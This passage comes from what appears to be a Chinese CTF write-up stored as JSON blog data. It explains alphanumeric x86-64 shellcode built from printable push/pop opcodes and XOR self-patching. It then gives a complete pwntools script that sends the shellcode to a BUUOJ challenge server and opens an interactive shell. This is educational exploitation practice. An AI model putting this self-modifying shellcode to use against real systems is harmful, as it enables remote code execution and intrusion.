<code>&quot;/bin/sh\\0&quot;</code>  放在栈上，但由于 xor 好像只支持 32 位数据，而寄存器以及 pop 入栈的数据都是 64 位，所以放入栈上的两段字符串无法连接，因此我也将字符串放在了 shellcode 的最后。</p>\n<table>\n<thead>\n<tr>\n<th>P</th>\n<th>0x50</th>\n<th>push %rax</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Q</td>\n<td>0x51</td>\n<td>push %rcx</td>\n</tr>\n<tr>\n<td>R</td>\n<td>0x52</td>\n<td>push %rdx</td>\n</tr>\n<tr>\n<td>S</td>\n<td>0x53</td>\n<td>push %rbx</td>\n</tr>\n<tr>\n<td>T</td>\n<td>0x54</td>\n<td>push %rsp</td>\n</tr>\n<tr>\n<td>U</td>\n<td>0x55</td>\n<td>push %rbp</td>\n</tr>\n<tr>\n<td>V</td>\n<td>0x56</td>\n<td>push %rsi</td>\n</tr>\n<tr>\n<td>W</td>\n<td>0x57</td>\n<td>push %rdi</td>\n</tr>\n<tr>\n<td>X</td>\n<td>0x58</td>\n<td>pop %rax</td>\n</tr>\n<tr>\n<td>Y</td>\n<td>0x59</td>\n<td>pop %rcx</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>0x5a</td>\n<td>pop %rdx</td>\n</tr>\n</tbody>\n</table>\n<p>可以利用的 <code>push</code>  和 <code>pop</code>  仅有上面几种，所以数据操作大部分以 <code>rax``rcx</code>  为中介。利用 <code>xor DWORD PTR [rdx+0x58], eax</code>  及变形对 shellcode 的数据进行操作。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=ELF('./shellcodere')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./shellcodere')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26414</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x40136E')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>assem <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>push rdi;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xor rdi, QWORD PTR [rcx];</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>xor esi, DWORD PTR [rcx]</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pop rax;\t</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>xor eax, 0x5a5a354e</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>xor DWORD PTR [rdx+0x4c], eax</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>xor eax, 0x5a303031;</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>xor eax, 0x5a58434f;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>xor al, 0x51;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>xor DWORD PTR [rdx+0x58], eax</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>xor eax, 0x36303031;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>xor eax, 0x5859524f;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>xor al, 0x51;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>xor DWORD PTR [rdx+0x54], eax</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>push rdx;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>xor al, 0x54;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>xor rdi, QWORD PTR [rcx];</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>push rdx;</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>xor al, 0x39</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>xor al, 0x32</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>xor al, 0x30</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>disasm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'magic'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x5a5a3041</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL1NoZWxsY29kZS9BcHBlbmRpeC9BbHBoYW51bWVyaWNfb3Bjb2Rl\">Alphanumeric opcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NtYWxPU25haWwvYXJ0aWNsZS9kZXRhaWxzLzEwNTIzNjMzNg==\"> 这是那篇怎么搜都出现两三遍的文章</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL0FscGhhbnVtZXJpY19zaGVsbGNvZGU=\"> https://nets.ec/Alphanumeric_shellcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODU4NzE=\">https://www.anquanke.com/post/id/85871</span></p>\n",
            "tags": [
                "shellcode",
                "stack migration",
                "format string",
                "integer overflow",
                "random",
                "canary"
            ]
        }
    ]
}